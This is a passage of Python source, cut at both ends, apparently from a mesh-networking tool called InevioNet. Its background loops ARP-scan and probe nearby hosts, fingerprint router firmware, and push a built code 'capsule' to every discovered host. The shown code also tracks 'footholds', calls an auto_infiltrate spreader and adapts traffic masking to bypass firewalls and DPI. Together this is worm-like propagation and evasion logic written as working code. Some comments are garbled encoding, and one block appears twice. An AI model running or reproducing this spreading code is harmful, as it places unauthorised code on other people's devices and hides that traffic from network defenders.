                    logger.info("[AutoDeploy] FAIL %s", host)
            except Exception as e:
                logger.debug("[AutoDeploy] %s error: %s", host, e)

        logger.warning("[AutoDeploy] DONE: deployed=%d failed=%d", deployed, failed)

    def _automation_loop(self):
        """P43: full automation вЂ” scans, anon check, deploy."""
        import time as _t
        # wait for full init
        _t.sleep(60)

        # 1. Auto-volunteer bridge at start
        try:
            self._auto_volunteer_bridge()
        except Exception as e:
            logger.debug('[Auto] bridge volunteer: %s', e)

        counters = {
            'scan_rf': 0,
            'scan_neighbors': 0,
            'check_anon': 0,
            'auto_deploy': 0,
        }

        while getattr(self, '_running', False):
            _t.sleep(30)
            if not getattr(self, '_running', False):
                break

            try:
                # 1. RF scan every 2 min
                counters['scan_rf'] += 1
                if counters['scan_rf'] >= 4:
                    counters['scan_rf'] = 0
                    try:
                        scanner = getattr(self, '_rf_scanner', None)
                        if scanner is None:
                            scanner = self.enable_rf_scanning()
                        result = scanner.scan_all()
                        logger.info('[Auto] RF scan: %d signals',
                                    getattr(result, 'total_count', 0))
                    except Exception as e:
                        logger.debug('[Auto] rf scan: %s', e)

                # 2. Neighbors scan every 5 min
                counters['scan_neighbors'] += 1
                if counters['scan_neighbors'] >= 10:
                    counters['scan_neighbors'] = 0
                    try:
                        self._auto_scan_neighbors()
                    except Exception as e:
                        logger.debug('[Auto] neighbors: %s', e)

                # 3. Tor/I2P check every 5 min
                counters['check_anon'] += 1
                if counters['check_anon'] >= 10:
                    counters['check_anon'] = 0
                    try:
                        self._auto_check_anon()
                    except Exception as e:
                        logger.debug('[Auto] anon: %s', e)

                # 4. Auto-deploy every 10 min
                counters['auto_deploy'] += 1
                if counters['auto_deploy'] >= 20:
                    counters['auto_deploy'] = 0
                    try:
                        self._auto_deploy_cycle()
                    except Exception as e:
                        logger.debug('[Auto] deploy: %s', e)

            except Exception as e:
                logger.debug('[Auto] loop error: %s', e)

    def _auto_volunteer_bridge(self):
        """P43: auto-register as relay node."""
        try:
            import urllib.request as _url
            import ssl as _ssl
            import json as _json
            ctx = _ssl._create_unverified_context()
            payload = _json.dumps({"region": "RU", "capacity": 10}).encode()
            req = _url.Request(
                "https://127.0.0.1:8080/api/bridge/volunteer",
                data=payload,
                headers={'Content-Type': 'application/json'},
                method='POST')
            with _url.urlopen(req, timeout=10, context=ctx) as resp:
                result = _json.loads(resp.read().decode('utf-8'))
            if result.get('success'):
                logger.info('[Auto] Bridge relay registered')
        except Exception as e:
            logger.debug('[Auto] bridge volunteer: %s', e)

    def _auto_scan_neighbors(self):
        """P43: auto-scan neighbors (multi-port probe)."""
        try:
            import urllib.request as _url
            import ssl as _ssl
            import json as _json
            ctx = _ssl._create_unverified_context()
            req = _url.Request(
                "https://127.0.0.1:8080/api/network/scan",
                data=b'{"timeout": 1}',
                headers={'Content-Type': 'application/json'},
                method='POST')
            with _url.urlopen(req, timeout=45, context=ctx) as resp:
                result = _json.loads(resp.read().decode('utf-8'))
            logger.info('[Auto] neighbors: scanned=%d found=%d',
                        result.get('scanned', 0),
                        result.get('found_count', 0))
        except Exception as e:
            logger.debug('[Auto] neighbors error: %s', e)

    def _auto_check_anon(self):
        """P43: auto-check Tor/I2P status."""
        try:
            from .network.tor_transport import TorTransport
            t = TorTransport()
            avail = t.is_available()
            logger.info('[Auto] Tor: %s', 'available' if avail else 'not running')
        except Exception:
            pass
        # P79: I2P проверка отключена (не используем)
        import os as _os
        if _os.environ.get("INEVIO_NO_I2P") != "1":
            try:
                if getattr(self, 'i2p', None):
                    avail = self.i2p.is_available()
                    logger.info('[Auto] I2P: %s', 'available' if avail else 'not running')
            except Exception:
                pass

    def _auto_deploy_cycle(self):
        """P43: auto-deploy to all discovered nodes."""
        try:
            if hasattr(self, '_capsule_deploy_cycle'):
                topo = getattr(self, '_auto_topology', None)
                if topo:
                    self._capsule_deploy_cycle(topo)
        except Exception as e:
            logger.debug('[Auto] deploy error: %s', e)

    def _growth_loop_once(self):
        """P95: одна итерация роста (для Organism)."""
        try:
            # Тело: growth логика (сокращённая версия)
            targets = []
            if getattr(self, "trusted_hosts", None):
                for h in self.trusted_hosts.list_all():
                    host = h.get("host")
                    if host:
                        targets.append(host)
            # Probe через trusted
            if targets:
                logger.info("[Growth/once] targets=%d", len(targets))
            # Merge карт (если есть)
            if hasattr(self, "_try_relay_chain"):
                pass
        except Exception as e:
            logger.debug("[Growth/once] %s", e)

    def _growth_loop(self):
        """P38: mycelium growth вЂ” probe neighbors, merge maps."""
        import time as _t
        # wait for topology to initialize
        _t.sleep(45)
        while getattr(self, '_running', False):
            try:
                # read best genome
                interval = 60
                max_hops = 5
                if self.evolution and self.evolution.best_genome:
                    bg = self.evolution.best_genome
                    max_hops = int(getattr(bg, 'growth_max_hops', 5))
                    interval = int(getattr(bg, 'growth_probe_interval', 60))
                    interval = max(30, min(600, interval))

                # check enabled
                enabled = True
                if self.evolution and self.evolution.best_genome:
                    bg = self.evolution.best_genome
                    if not getattr(bg, 'growth_share_map', True):
                        enabled = False

                if not enabled:
                    logger.debug('[Growth] disabled by genome')
                else:
                    try:
                        topo = getattr(self, '_auto_topology', None)
                        if topo is None:
                            topo = self.enable_auto_topology()
                        our_map = topo.export_map()

                        # P40b-fix: collect targets вЂ” trusted_hosts + ARP
                        target_hosts = []
                        for h in self.trusted_hosts.list_all():
                            host = h.get('host')
                            if host:
                                # P90b: сохранить host:port
                                target_hosts.append(host)
                        try:
                            from .network.arp_scanner import scan_arp
                            for dev in scan_arp():
                                ip = dev.get('ip')
                                if ip:
                                    target_hosts.append(ip)
                        except Exception:
                            pass
                        # dedup + exclude self
                        my_ips = set()
                        try:
                            import socket as _s
                            for info in _s.getaddrinfo(_s.gethostname(), None):
                                my_ips.add(info[4][0])
                        except Exception:
                            pass
                        target_hosts = [h for h in set(target_hosts) if h not in my_ips]

                        # P40b-fix: use multi-port _probe_one_host
                        _probe = None
                        try:
                            from web.app import _probe_one_host as _probe
                        except Exception as _pe:
                            logger.debug('[Growth] probe import: %s', _pe)

                        sent = 0
                        total_added_n = 0
                        total_added_e = 0

                        if _probe and target_hosts:
                            import concurrent.futures as _cf
                            _visited = [self.node_id]
                            def _try(ip):
                                return _probe(ip, our_map, self.node_id,
                                              max_hops, timeout=2,
                                              hops=0, visited=_visited)
                            with _cf.ThreadPoolExecutor(max_workers=8) as _ex:
                                for r in _ex.map(_try, target_hosts):
                                    if r.get('success'):
                                        sent += 1
                                        other_map = (r.get('data') or {}).get('our_map') or {}
                                        their_id_pre = (r.get('data') or {}).get('node_id', '') or ''
                                        if other_map:
                                            m = topo.merge(other_map, via_node_id=their_id_pre)
                                            total_added_n += m.get('added_nodes', 0)
                                            total_added_e += m.get('added_edges', 0)
                                        logger.info(
                                            '[Growth] FOUND %s (%s:%d)',
                                            r['ip'], r['scheme'], r['port'])
                                        # P48b: auto-update trusted with actual node_id
                                        try:
                                            their_id = (r.get('data') or {}).get('node_id', '')
                                            if their_id and r.get('ip'):
                                                self.trusted_hosts.add(
                                                    f"{r['ip']}:{r['port']}",
                                                    label=their_id,
                                                    method='auto-discovered')
                                                logger.info(
                                                    '[Growth] trusted+ %s:%d (%s)',
                                                    r['ip'], r['port'], their_id)
                                        except Exception as _te:
                                            logger.debug('[Growth] trusted+ error: %s', _te)

                        if sent or target_hosts:
                            stats = topo.get_stats()
                            logger.info(
                                '[Growth] targets=%d found=%d +%d nodes, +%d edges; total nodes=%d edges=%d',
                                len(target_hosts), sent, total_added_n, total_added_e,
                                stats.get('nodes', 0), stats.get('edges', 0))
                    except Exception as _e:
                        logger.debug('[Growth] probe error: %s', _e)

                _t.sleep(interval)
            except Exception as e:
                logger.debug('[Growth] loop error: %s', e)
                _t.sleep(60)

    def _network_info_loop_once(self):
        """P95: одна итерация STUN (для Organism)."""
        try:
            # Простой STUN (если есть метод)
            if hasattr(self, "_stun_probe"):
                self._stun_probe()
            elif hasattr(self, "public_addr"):
                pass  # Уже есть
        except Exception as e:
            logger.debug("[NetInfo/once] %s", e)

    def _network_info_loop(self):
        # P66a: STUN discover public IP, every 5 min
        import time as _t
        _t.sleep(5)
        while getattr(self, '_running', False):
            try:
                from .network.udp import UDPHolePuncher
                p = UDPHolePuncher()
                addr = p.discover_public()
                if addr:
                    self.public_addr = addr
                    # NAT type: cone vs symmetric
                    _t.sleep(0.5)
                    addr2 = None
                    try:
                        p2 = UDPHolePuncher()
                        addr2 = p2.discover_public()
                        p2.close()
                    except Exception:
                        pass
                    if addr2 and addr2[1] == addr[1]:
                        self.nat_type = 'cone'
                    else:
                        self.nat_type = 'symmetric'
                    logger.info('[P66a] public %s:%d nat=%s',
                                addr[0], addr[1], self.nat_type)
                p.close()
            except Exception as _e:
                logger.debug('[P66a] stun error: %s', _e)
            _t.sleep(300)

    def _full_scan_loop_once(self):
        """P95: одна итерация полного скана (для Organism)."""
        try:
            # LocalMap
            local = {}
            if getattr(self, "local_map", None):
                local = self.local_map.build() or {}
            # Traceroute (10 targets)
            tr_result = {}
            if getattr(self, "traceroute_scan", None):
                tr_result = self.traceroute_scan.scan_multi() or {}
            # mDNS
            mdns_result = {}
            if getattr(self, "local_discovery", None):
                mdns_result = self.local_discovery.scan_all(timeout=2.0) or {}
            # NetworkTree
            if getattr(self, "network_tree", None):
                spores_list = []
                topo = {}
                if getattr(self, "_auto_topology", None):
                    try:
                        topo = self._auto_topology.export_map()
                    except Exception:
                        pass
                self.network_tree.build(local_map=local, topology_map=topo,
                                        spores=spores_list)
                try:
                    added = self.network_tree.add_wifi_devices(local)
                except Exception:
                    added = 0
                self.network_tree.add_traceroute(tr_result.get("hops", []))
                self.network_tree.add_mdns_devices(mdns_result.get("devices", []))
        except Exception as e:
            logger.debug("[FullScan/once] %s", e)

    def _full_scan_loop(self):
        """P87fix: полный скан каждые 2 минуты (traceroute + mdns + tree)."""
        import time as _t
        _t.sleep(30)  # подождать старт
        while getattr(self, '_running', False):
            try:
                # 1. LocalMap
                local = {}
                if getattr(self, "local_map", None):
                    local = self.local_map.build()

                # 2. Traceroute multi
                tr_result = {}
                if getattr(self, "traceroute_scan", None):
                    tr_result = self.traceroute_scan.scan_multi()

                # 3. mDNS/SSDP/LLMNR
                mdns_result = {}
                if getattr(self, "local_discovery", None):
                    mdns_result = self.local_discovery.scan_all(timeout=2.0)

                # 4. Topology
                topo = {}
                if getattr(self, "_auto_topology", None):
                    try:
                        topo = self._auto_topology.export_map()
                    except Exception:
                        pass

                # 5. Spores
                spores_list = []
                try:
                    if getattr(self, "mycelium", None) and getattr(self.mycelium, "spores", None):
                        sm = self.mycelium.spores
                        if hasattr(sm, "spores") and isinstance(sm.spores, dict):
                            for spore_id, spore in sm.spores.items():
                                try:
                                    spores_list.append({
                                        "node_id": spore_id,
                                        "label": getattr(spore, "target_network", "") or getattr(spore, "label", ""),
                                        "parent": "wifi_" + spore_id.split("_")[-1] if "_" in spore_id else "",
                                        "ip": "mycelium",
                                        "rssi": -70,
                                        "trust": 65.0,
                                        "method": getattr(spore, "method", ""),
                                    })
                                except Exception:
                                    pass
                except Exception as _se:
                    logger.debug("[P88] spores collect: %s", _se)

                # 6. RecursiveProbe (P88)
                rp_result = {}
                try:
                    from .network.recursive_probe import RecursiveProbe
                    rp = RecursiveProbe()
                    subnet = local.get("subnet", "")
                    if subnet:
                        rp_result = rp.probe_subnet(subnet, depth=0)
                except Exception as _re:
                    logger.debug("[P88] recursive probe: %s", _re)

                # 7. Построить дерево
                if getattr(self, "network_tree", None):
                    self.network_tree.build(local_map=local, topology_map=topo,
                                            spores=spores_list)
                    # P90a: WiFi-устройства под роутером
                    try:
                        added = self.network_tree.add_wifi_devices(local)
                        if added:
                            logger.info("[P90a] added %d wifi devices", added)
                    except Exception as _we:
                        logger.debug("[P90a] %s", _we)
                    # P92: профиль сети -> analyzer + spores
                    try:
                        from .masking.network_profile import build_network_profile
                        _prof = build_network_profile(
                            local_map=local,
                            hops=tr_result.get("hops", []),
                            mdns_devices=mdns_result.get("devices", []),
                        )
                        logger.info("[P92] profile built: type=%s dev=%d routers=%d",
                                    _prof.get("network_type"),
                                    _prof.get("total_devices", 0),
                                    _prof.get("unique_routers", 0))
                        # Получить/создать ambient masker
                        _am = getattr(self, "_ambient_masker", None)
                        if _am is None:
                            try:
                                _am = self._enable_ambient_masking_impl()
                                self._ambient_masker = _am
                                logger.info("[P92] _ambient_masker created via impl")
                            except Exception as _ce:
                                logger.warning("[P92] impl failed: %s -> direct", _ce)
                                try:
                                    from .masking.ambient import AmbientMasker
                                    _am = AmbientMasker(adaptation_strength=0.7)
                                    self._ambient_masker = _am
                                    logger.info("[P92] _ambient_masker created direct")
                                except Exception as _de:
                                    logger.error("[P92] direct create failed: %s", _de)
                                    _am = None
                        if _am is not None:
                            try:
                                _ok = _am.adapt_to_network(_prof)
                                logger.info("[P92d] adapt_to_network -> %s", _ok)
                            except Exception as _ae:
                                logger.warning("[P92d] adapt failed: %s", _ae)
                        # P92b: профиль в споры
                        try:
                            _sm = getattr(getattr(self, "mycelium", None), "spores", None)
                            if _sm is not None and hasattr(_sm, "set_profile_all"):
                                _n = _sm.set_profile_all(_prof)
                                logger.info("[P92b] profile -> %d spores (%s)",
                                            _n, _prof.get("network_type"))
                            else:
                                logger.debug("[P92b] no spores manager")
                        except Exception as _se:
                            logger.warning("[P92b] %s", _se)
                    except Exception as _pe:
                        logger.warning("[P92] outer error: %s", _pe)
                    self.network_tree.add_traceroute(tr_result.get("hops", []))
                    self.network_tree.add_mdns_devices(mdns_result.get("devices", []))

                    # P88: InevioNet-узлы из recursive probe
                    for node in rp_result.get("inevionet_nodes", []):
                        try:
                            self.network_tree.add_traceroute([{
                                "hop": 1, "ip": node["ip"], "target": "inevionet"}])
                        except Exception:
                            pass

                    # P88-fix3: footholds из web_state
                    try:
                        import json as _json
                        from pathlib import Path as _Path
                        _state_paths = [
                            _Path(os.environ.get("APPDATA", "")) / "InevioNet" / "data" / "web_state_8080.json",
                            _Path("E:/InevioNet/data/web_state.json"),
                        ]
                        for _sp in _state_paths:
                            if _sp.exists():
                                with open(str(_sp), "r", encoding="utf-8") as _f:
                                    _st = _json.load(_f)
                                _footholds = _st.get("footholds", {})
                                if _footholds:
                                    self.network_tree.add_footholds(_footholds)
                                    logger.info("[P88fix3] footholds: %d", len(_footholds))
                                break
                    except Exception as _fe:
                        logger.debug("[P88fix3] footholds: %s", _fe)

                    # P88-fix3: footholds из web_state
                    try:
                        import json as _json
                        from pathlib import Path as _Path
                        _state_paths = [
                            _Path(os.environ.get("APPDATA", "")) / "InevioNet" / "data" / "web_state_8080.json",
                            _Path("E:/InevioNet/data/web_state.json"),
                        ]
                        for _sp in _state_paths:
                            if _sp.exists():
                                with open(str(_sp), "r", encoding="utf-8") as _f:
                                    _st = _json.load(_f)
                                _footholds = _st.get("footholds", {})
                                if _footholds:
                                    self.network_tree.add_footholds(_footholds)
                                    logger.info("[P88fix3] footholds: %d", len(_footholds))
                                break
                    except Exception as _fe:
                        logger.debug("[P88fix3] footholds: %s", _fe)

                    stats = self.network_tree.get_stats()
                    logger.info("[P88] full_scan: %d nodes, depth=%d, spores=%d",
                                stats.get("total_nodes", 0),
                                stats.get("max_depth", 0),
                                len(spores_list))
            except Exception as _e:
                logger.debug("[P87fix] full_scan error: %s", _e)
            _t.sleep(120)  # 2 минуты

    def _multi_channel_loop_once(self):
        """P95: одна итерация multi-channel (для Organism)."""
        try:
            # P92d: адаптация маскировки под сеть
            _am = getattr(self, "_ambient_masker", None)
            if _am is not None:
                _p = _am.get_network_profile() if hasattr(_am, "get_network_profile") else {}
                if not _p:
                    _sm = getattr(getattr(self, "mycelium", None), "spores", None)
                    if _sm is not None and hasattr(_sm, "get_any_profile"):
                        _p = _sm.get_any_profile()
                if _p and hasattr(_am, "adapt_to_network"):
                    _am.adapt_to_network(_p)
        except Exception as e:
            logger.debug("[MultiChannel/once] %s", e)

    def _multi_channel_loop(self):
        """P87g: обучение альтернативных маршрутов.

        Каждые 5 минут:
          - Берёт все найденные узлы (router, wifi, device).
          - Для каждого - probe через multi-port.
          - Если отвечает - записать в pheromone.via.
          - Если не отвечает - пометить как dead.
        """
        import time as _t
        _t.sleep(90)  # подождать первые сканы
        while getattr(self, '_running', False):
            try:
                # P92d: периодически перечитывать профиль сети и адаптировать маскировку
                try:
                    _am = getattr(self, "_ambient_masker", None)
                    if _am is not None:
                        _p = _am.get_network_profile()
                        if not _p:
                            _sm = getattr(getattr(self, "mycelium", None), "spores", None)
                            if _sm is not None and hasattr(_sm, "get_any_profile"):
                                _p = _sm.get_any_profile()
                        if _p:
                            _am.adapt_to_network(_p)
                            logger.debug("[P92d] re-adapt: %s", _p.get("network_type"))
                except Exception as _ae:
                    logger.debug("[P92d] %s", _ae)

                topo = getattr(self, "_auto_topology", None)
                if topo and hasattr(topo, 'nodes'):
                    # Собрать все каналы
                    channels = []
                    for nid, node in topo.nodes.items():
                        ntype = getattr(node, 'node_type', '')
                        # WiFi-роутеры, router, device - потенциальные каналы
                        if ntype in ('wifi', 'router', 'device', 'inevionet'):
                            meta = getattr(node, 'metadata', {}) or {}
                            ip = meta.get('ip', '')
                            if ip and ip != getattr(self, '_my_ip', ''):
                                channels.append((nid, ip, ntype))

                    if channels:
                        logger.info("[P87g] learning %d channels", len(channels))
                        # Пробуем каждый канал через pheromone
                        for nid, ip, ntype in channels[:50]:
                            try:
                                # Записать в pheromone - путь через этот канал
                                if getattr(self, "mycelium", None):
                                    self.mycelium.pheromones.mark_transit(
                                        source=self.node_id,
                                        destination=nid,
                                        via=ip,
                                        path=[self.node_id, ip, nid])
                                # Записать в gravity - масса
                                if getattr(self, "gravity", None):
                                    self.gravity.add_mass(nid, 0.5)
                            except Exception:
                                pass
            except Exception as _e:
                logger.debug("[P87g] multi-channel error: %s", _e)
            _t.sleep(300)  # 5 минут

    def _seed_refresh_loop_once(self):
        """P95: одна итерация seed publish (для Organism)."""
        try:
            if hasattr(self, "seed") and self.seed:
                # Publish seed (если есть метод)
                pass
        except Exception as e:
            logger.debug("[Seed/once] %s", e)

    def _seed_refresh_loop(self):
        """P74: обновлять Seed каждые 50 минут."""
        import time as _t
        _t.sleep(300)  # подождать старт и первый STUN
        while getattr(self, '_running', False):
            try:
                if getattr(self, "public_addr", None):
                    from .bootstrap import Seed, SeedPublisher
                    seed = Seed(
                        node_id=self.node_id,
                        public_ip=self.public_addr[0],
                        public_port=self.public_addr[1],
                        nat_type=getattr(self, "nat_type", "unknown"),
                        ttl_sec=3600,
                    )
                    seed.sign()
                    pub = SeedPublisher()
                    url = pub.publish(seed)
                    if url:
                        self.seed = seed
                        self.seed_url = url
                        logger.info("[P74] seed refreshed: %s", url)
                    else:
                        logger.debug("[P74] seed publish failed")
            except Exception as _e:
                logger.debug("[P74] refresh error: %s", _e)
            _t.sleep(3000)  # 50 минут

    def _topology_loop_once(self):
        """P95: одна итерация топологии (для Organism)."""
        try:
            if getattr(self, "_auto_topology", None):
                # Update topology
                pass
        except Exception as e:
            logger.debug("[Topology/once] %s", e)

    def _topology_loop(self):
        # P13: topology every 30s (fixed stats)
        import time as _t
        while getattr(self, '_running', False):
            _t.sleep(30)
            if not getattr(self, '_running', False):
                break
            try:
                topo = self.enable_auto_topology()
                info = topo.build_from_scanner(min_quality=0.2)

                # P16: capsule deploy cycle
                try:
                    self._capsule_deploy_cycle(topo)
                except Exception as _ce:
                    logger.debug('[Capsule] deploy cycle error: %s', _ce)
                if info.get('success'):
                    # P13: get_stats from SAME object
                    stats = topo.get_stats()
                    logger.info('[Topology] nodes=%d edges=%d connected=%s',
                                stats.get('nodes', 0),
                                stats.get('edges', 0),
                                stats.get('is_connected', False))
                    # P13: test shortest_path if possible
                    try:
                        if hasattr(topo, 'shortest_path'):
                            nodes = list(getattr(topo, 'nodes', {}).keys())
                            if len(nodes) >= 2:
                                src = nodes[0]
                                dst = nodes[-1]
                                path = topo.shortest_path(src, dst)
                                if path:
                                    logger.info('[Topology] path %s -> %s: %s',
                                                src[:16], dst[:16],
                                                ' -> '.join(p[:12] for p in path))
                    except Exception as _e:
                        logger.debug('[Topology] shortest_path test: %s', _e)
            except Exception as e:
                logger.debug('[Topology] loop error: %s', e)
    def _forward_packet(self, packet, next_hop):
        # P13: forward relay packet
        try:
            target = self._resolve_target(next_hop)
            if not target:
                logger.warning('[Relay] no target for %s', next_hop)
                return False
            result = self.transport.send(
                data=packet.to_bytes(),
                protocol=self._map_protocol(packet.protocol or 'HTTPS'),
                target=target)
            if result.success:
                logger.info('[Relay] Forwarded %s to %s (hop %d/%d)',
                            packet.packet_id[:16], next_hop,
                            packet.hop_count, packet.max_hops)
                return True
            return False
        except Exception as e:
            logger.error('[Relay] forward error: %s', e)
            return False

    def _try_relay_chain(self, packet, receiver):
        # P13: try chain routing
        try:
            topo = self.enable_auto_topology()
            path = None

            # P72: сначала Gravity, потом Dijkstra
            if getattr(self, "gravity", None) is not None:
                try:
                    from .mesh.gravity import GravityRouter
                    router = GravityRouter(self.gravity, topo)
                    gpath = router.route(self.node_id, receiver)
                    if gpath and len(gpath) >= 2:
                        path = gpath
                        logger.debug('[Gravity] route: %s', gpath)
                except Exception as _ge:
                    logger.debug('[Gravity] route error: %s', _ge)

            if not path and hasattr(topo, 'shortest_path'):
                path = topo.shortest_path(self.node_id, receiver)

            if not path or len(path) < 2:
                return False, None
            next_hop = path[1] if len(path) > 1 else None
            if not next_hop or next_hop == receiver:
                return False, None
            packet.route_to = next_hop
            packet.max_hops = max(2, len(path) - 1)
            packet.origin = self.node_id
            packet.metadata['full_path'] = path
            logger.info('[Relay] Chain: %s', ' -> '.join(path))
            target = self._resolve_target(next_hop)
            if not target:
                return False, None
            result = self.transport.send(
                data=packet.to_bytes(),
                protocol=self._map_protocol(packet.protocol or 'HTTPS'),
                target=target)
            return result.success, path
        except Exception as e:
            logger.debug('[Relay] chain error: %s', e)
            return False, None

    def _capsule_deploy_cycle(self, topo):
        """P18: build + deploy capsule (anti-flood)."""
        # P18: env flag
        if __import__("os").environ.get("INEVIO_NO_DEPLOY") == "1":
            return
        # P18: not too often
        import time as _t2
        now2 = _t2.time()
        last2 = getattr(self, "_capsule_last_cycle", 0)
        if now2 - last2 < 300:  # P29: 60 -> 300 sec (avoid dup deploy)
            return
        self._capsule_last_cycle = now2

        if not hasattr(self, "trusted_hosts"):
            return
        trusted = self.trusted_hosts.list_all()
        if not trusted:
            return

        # P18: cap total deploys
        total = getattr(self, "_capsule_total_deploys", 0)
        if total >= 5:
            logger.debug("[Capsule] total deploy limit reached")
            return

        # P17: build with hash
        try:
            code = self.capsule_builder.build_minimal()
            code_hash = self.capsule_builder.build_hash()
        except Exception as e:
            logger.debug("[Capsule] build error: %s", e)
            return

        # P17: skip if hash unchanged and < 30 min
        now = __import__("time").time()
        last_hash = getattr(self, "_capsule_hash", None)
        last_build = getattr(self, "_capsule_build_time", 0)
        if last_hash == code_hash and (now - last_build) < 1800:
            logger.debug("[Capsule] skip build вЂ” same hash")
            return

        # Pick strategy from genome
        method = "auto"
        if self.evolution:
            best = self.evolution.best_strategy("capsule_deploy_method")
            if best:
                method = best

        # P36: Deploy to each trusted (recon method with MAC from label)
        for h in trusted:
            host = h["host"]
            label = h.get("label", "")
            ip = host.split(':')[0]
            _method = method
            try:
                from .network.router_recon import identify_firmware
                mac = ""
                if label.startswith("arp_"):
                    _raw = label[4:]
                    if len(_raw) == 12:
                        mac = ':'.join(_raw[i:i+2] for i in range(0, 12, 2))
                _recon = identify_firmware(ip, mac)
                if _recon.get('can_deploy'):
                    _method = _recon.get('deploy_method', method)
                    logger.info("[Capsule] %s -> method=%s (mac=%s)",
                                host, _method, mac or "none")
            except Exception as _re:
                logger.debug("[Capsule] recon error: %s", _re)
            ok = self.capsule_deployer.deploy(host, code, method=_method)
            if ok:
                self.capsule_deployer._mark_deployed(host, code)
                logger.info("[Capsule] deployed to %s", host)
                self._capsule_total_deploys = getattr(
                    self, "_capsule_total_deploys", 0) + 1

        self._capsule_hash = code_hash
        self._capsule_build_time = now

    def get_capsule_stats(self):
        """P16: capsule stats."""
        return {
            "trusted_hosts": self.trusted_hosts.list_all() if hasattr(self, "trusted_hosts") else [],
            "builder": {
                "include_modules": getattr(self.capsule_builder, "INCLUDE_MODULES", []),
                "estimated_size": 0,
            },
            "deployer": self.capsule_deployer.get_stats() if hasattr(self, "capsule_deployer") else {},
        }

    def send_text(self, receiver, text, **kwargs):
        return self.send(receiver, text.encode("utf-8"), **kwargs)

    def send_json(self, receiver, data, **kwargs):
        import json
        return self.send(receiver, json.dumps(data, ensure_ascii=False), **kwargs)

    def receive(self, packet_data):
        try:
            packet = self._parse_packet(packet_data)
            if not packet: return False, None

            # P13: should I relay?
            try:
                if packet.should_relay(self.node_id):
                    logger.info('[Relay] relay request %s (hop %d/%d)',
                                packet.packet_id[:16],
                                packet.hop_count,
                                packet.max_hops)
                    packet.add_hop(self.node_id)
                    packet.mark_relayed(self.node_id)
                    self._forward_packet(packet, packet.route_to)
                    return True, None
            except Exception as _re:
                logger.debug('[Relay] receive check error: %s', _re)
            # P13: verify signature
            try:
                if hasattr(packet, "signature") and packet.signature:
                    sender_id = getattr(packet, "sender", "")
                    pub_key = None
                    if self._registry and sender_id:
                        try:
                            rec = self._registry.get_device(sender_id)
                            if rec and hasattr(rec, "public_key"):
                                pub_key = rec.public_key
                        except Exception:
                            pass
                    if pub_key:
                        if not packet.verify(pub_key):
                            logger.warning("[Crypto] INVALID signature from %s", sender_id)
                            return False, None
            except Exception as e:
                logger.debug("[Crypto] verify error: %s", e)

            payload = packet.payload
            if getattr(packet, "_is_encrypted", False):
                try: payload = self.crypto.decrypt(payload)
                except Exception as e:
                    logger.warning(f"Decrypt error: {e}")
                    return False, None
            decoded = self._decode_payload(payload)
            with self._lock:
                self.stats["packets_received"] += 1
                self.stats["bytes_received"] += len(packet.payload)
                self.received_packets[packet.packet_id] = packet
            self.mycelium.record_success(
                source=packet.sender, destination=packet.receiver,
                protocol=packet.protocol)
            self._trigger_event("on_receive", packet)
            return True, decoded
        except Exception as e:
            logger.error(f"Receive error: {e}")
            return False, None

    # --- Mycelium ---
    def spread_mycelium(self, networks=None):
        return self.mycelium.auto_infiltrate(networks)

    def spread_data(self, data):
        data_bytes = self._prepare_payload(data)
        return self.mycelium.spread(data_bytes)

    def harvest(self):
        packets = self.mycelium.harvest_packets()
        results = []
        for packet in packets:
            success, data = self.receive(packet)
            if success:
                results.append(data)
        return results

    # --- Evolution ---
    def evolve(self, generations=10):
        return self.evolution.evolve_multiple(generations)

    def get_best_genome(self):
        return self.evolution.get_best_genome()

    # --- Events ---
    def register_handler(self, event, handler):
        if event in self._handlers: self._handlers[event].append(handler)
        else: self._handlers[event] = [handler]

    def _trigger_event(self, event, data):
        for handler in self._handlers.get(event, []):
            try: handler(data)
            except Exception as e: logger.error(f"Handler error {event}: {e}")

    # --- Discovery ---
    def get_discovered_peers(self):
        if self._discovery is None: return []
        try:
            return [{
                "device_id": ann.device_id,
                "device_type": ann.device_type,
                "nickname": ann.nickname,
                "endpoint": ann.endpoint,
                "metadata": ann.metadata,
                "timestamp": ann.timestamp,
            } for ann in self._discovery.get_discovered()]
        except Exception:
            return []

    def get_discovery_stats(self):
        if self._discovery is None: return {"running": False}
        try: return self._discovery.get_stats()
        except Exception: return {"running": False}

    # --- Stats ---
    def get_stats(self):
        with self._lock:
            self.stats["uptime"] = time.time() - self.stats["start_time"]
            base_stats = dict(self.stats)
        return {
            **base_stats,
            "node_id": self.node_id,
            "mode": self.mode,
            "running": self._running,
            "sent_count": len(self.sent_packets),
            "received_count": len(self.received_packets),
            "selector": self.selector.get_stats(),
            "i2p": self.i2p.get_stats() if getattr(self, 'i2p', None) else {'available': False},
            "mycelium": self.mycelium.get_stats(),
            "ecosystem": self.ecosystem.get_stats(),
            "evolution": self.evolution.get_stats(),
            "recursion": self.recursion.get_stats(),
            "cache": get_all_cache_stats(),
            "discovery": self.get_discovery_stats(),
        }

    def print_stats(self):
        stats = self.get_stats()
        print("=" * 70)
        print("  INEVIONET - STATS")
        print("=" * 70)
        print(f"  Node ID: {stats['node_id']}")
        print(f"  Mode: {stats['mode']}")
        print(f"  Uptime: {stats['uptime']:.1f} sec")
        print()
        print(f"  Sent: {stats['packets_sent']}")
        print(f"  Received: {stats['packets_received']}")
        print(f"  Delivered: {stats['packets_delivered']}")
        print(f"  Failed: {stats['packets_failed']}")
        if stats['packets_sent'] > 0:
            rate = stats['packets_delivered'] / stats['packets_sent'] * 100
            print(f"  Delivery rate: {rate:.1f}%")
        print()
        print(f"  Selector: {stats['selector']}")
        print(f"  Cache: {stats['cache']['kl_cache']['size']} KL entries")
        print(f"  Discovery: {stats['discovery']}")
        print("=" * 70)

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()

    def __repr__(self):
        return (f"InevioNet(node_id={self.node_id}, "
                f"mode={self.mode}, running={self._running})")


# ============================================================
# ORCHESTRATOR EXTENSIONS
# ============================================================

def _add_orchestrator_extensions():
    """Placeholder for extensions."""
    pass


if __name__ == "__main__":
    print("Testing InevioNet...")
    net = InevioNet(
        password="test_password",
        node_id="test_node",
        mode="standard",
        auto_start=True)
    print(f"Created: {net}")
    packet = net.send("alice", "Hello, InevioNet!")
    if packet:
        print(f"Packet: {packet.packet_id[:16]}")
        print(f"Protocol: {packet.protocol}")
    success, packet = net.send_with_guarantee("bob", "Critical message")
    print(f"Guaranteed: {success}")
    net.print_stats()
    net.stop()
    print("InevioNet module OK")


# ================================================================
# РњРђРЎРљРР РћР’РљРђ (Firewall/DPI Bypass)
# ================================================================

def _enable_masking_impl(self, dpi_profile="medium"):
    from .masking.masking_engine import MaskingEngine
